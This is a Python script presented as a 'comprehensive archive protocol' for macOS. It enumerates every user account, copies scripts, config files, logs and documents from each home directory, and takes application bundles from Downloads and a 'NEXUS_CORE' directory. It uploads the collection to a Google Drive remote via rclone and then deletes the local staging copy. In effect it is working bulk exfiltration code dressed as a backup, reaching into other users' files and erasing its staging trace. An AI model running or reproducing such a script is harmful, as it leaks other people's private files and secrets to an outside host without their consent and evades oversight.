import os
import shutil
import subprocess
import pwd

# --- COMPREHENSIVE ARCHIVE PROTOCOL v3.0 ---
HOME_DIR = os.path.expanduser("~")
STAGING_PATH = "/Volumes/Transfer/NEXUS_COMPREHENSIVE_ARCHIVE"
USERS_BASE = "/Users"

# Target file types and directories for comprehensive archival
VITAL_EXTENSIONS = ['.py', '.sh', '.js', '.json', '.yaml', '.yml', '.conf', '.config', '.plist', '.txt', '.md', '.log']
VITAL_DIRECTORIES = ['scripts', 'Documents', 'Desktop', 'Downloads', 'Projects', 'Development', 'Code']
LARGE_TARGETS = ["android studio", "final cut pro", "cinema 4d", "xcode", "applications"]

def run_command(command):
    """Executes a shell command and prints its output."""
    try:
        process = subprocess.run(
            command,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        print(f"SUCCESS: {process.stdout}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"ERROR: Command failed with exit code {e.returncode}")
        print(f"Stderr: {e.stderr}")
        return False

def get_all_users():
    """Get all user directories on the system."""
    users = []
    try:
        for entry in os.listdir(USERS_BASE):
            user_path = os.path.join(USERS_BASE, entry)
            if os.path.isdir(user_path) and not entry.startswith('.'):
                users.append(entry)
    except PermissionError:
        print("Permission denied accessing /Users directory")
    return users

def archive_vital_files(user_home, user_staging):
    """Archive vital configuration and script files from a user directory."""
    vital_count = 0
    
    for root, dirs, files in os.walk(user_home):
        # Skip system directories and hidden directories
        dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['Library', 'Applications']]
        
        for file in files:
            if any(file.endswith(ext) for ext in VITAL_EXTENSIONS):
                source_path = os.path.join(root, file)
                rel_path = os.path.relpath(source_path, user_home)
                dest_path = os.path.join(user_staging, 'vital_files', rel_path)
                
                try:
                    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                    shutil.copy2(source_path, dest_path)
                    vital_count += 1
                except (PermissionError, OSError) as e:
                    continue
    
    return vital_count

def comprehensive_archive():
    """
    Comprehensive archive protocol targeting all users and vital system files.
    """
    print("--- COMPREHENSIVE ARCHIVE PROTOCOL v3.0 INITIATED ---")
    print(f"Master Staging Area: {STAGING_PATH}")
    
    # Create master staging directory
    os.makedirs(STAGING_PATH, exist_ok=True)
    
    # Get all users on the system
    users = get_all_users()
    print(f"\n[+] Discovered users: {users}")
    
    total_vital_files = 0
    total_large_assets = 0
    
    for user in users:
        user_home = os.path.join(USERS_BASE, user)
        user_staging = os.path.join(STAGING_PATH, f"user_{user}")
        
        print(f"\n[+] Processing user: {user}")
        
        # Create user-specific staging directory
        os.makedirs(user_staging, exist_ok=True)
        
        # Archive vital files
        try:
            vital_count = archive_vital_files(user_home, user_staging)
            total_vital_files += vital_count
            print(f"    -> Archived {vital_count} vital files")
        except Exception as e:
            print(f"    -> Error archiving vital files: {e}")
        
        # Archive large assets from Downloads
        downloads_path = os.path.join(user_home, "Downloads")
        if os.path.exists(downloads_path):
            try:
                for item in os.listdir(downloads_path):
                    for target in LARGE_TARGETS:
                        if target.lower() in item.lower():
                            source_path = os.path.join(downloads_path, item)
                            dest_path = os.path.join(user_staging, 'large_assets', item)
                            
                            try:
                                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                                if os.path.isdir(source_path):
                                    shutil.copytree(source_path, dest_path, dirs_exist_ok=True)
                                else:
                                    shutil.copy2(source_path, dest_path)
                                total_large_assets += 1
                                print(f"    -> Archived large asset: {item}")
                            except Exception as e:
                                print(f"    -> Error archiving {item}: {e}")
                            break
            except PermissionError:
                print(f"    -> Permission denied accessing Downloads for {user}")
    
    # Archive NEXUS_CORE specifically
    nexus_core_source = os.path.join(HOME_DIR, "NEXUS_CORE")
    if os.path.exists(nexus_core_source):
        nexus_core_dest = os.path.join(STAGING_PATH, "NEXUS_CORE_BACKUP")
        try:
            shutil.copytree(nexus_core_source, nexus_core_dest, dirs_exist_ok=True)
            print(f"\n[+] NEXUS_CORE backed up to {nexus_core_dest}")
        except Exception as e:
            print(f"\n[!] Error backing up NEXUS_CORE: {e}")
    
    print(f"\n[+] Archive Summary:")
    print(f"    -> Total vital files archived: {total_vital_files}")
    print(f"    -> Total large assets archived: {total_large_assets}")
    print(f"    -> Users processed: {len(users)}")
    
    # Initiate cloud transfer
    print(f"\n[+] Initiating comprehensive cloud transfer...")
    rclone_command = f"rclone copy '{STAGING_PATH}' gdrive:NEXUS_COMPREHENSIVE_ARCHIVE --progress --transfers=4"
    
    print(f"Executing: {rclone_command}")
    success = run_command(rclone_command)
    
    if success:
        print("\n[+] Cloud transfer completed successfully")
        # Clean up local staging after successful upload
        print("[+] Cleaning up local staging area...")
        try:
            shutil.rmtree(STAGING_PATH)
            print("    -> Local staging area cleaned")
        except Exception as e:
            print(f"    -> Error cleaning staging area: {e}")
    else:
        print("\n[!] Cloud transfer failed - staging area preserved for retry")
    
    print("\n--- COMPREHENSIVE ARCHIVE PROTOCOL COMPLETE ---")

if __name__ == "__main__":
    comprehensive_archive()
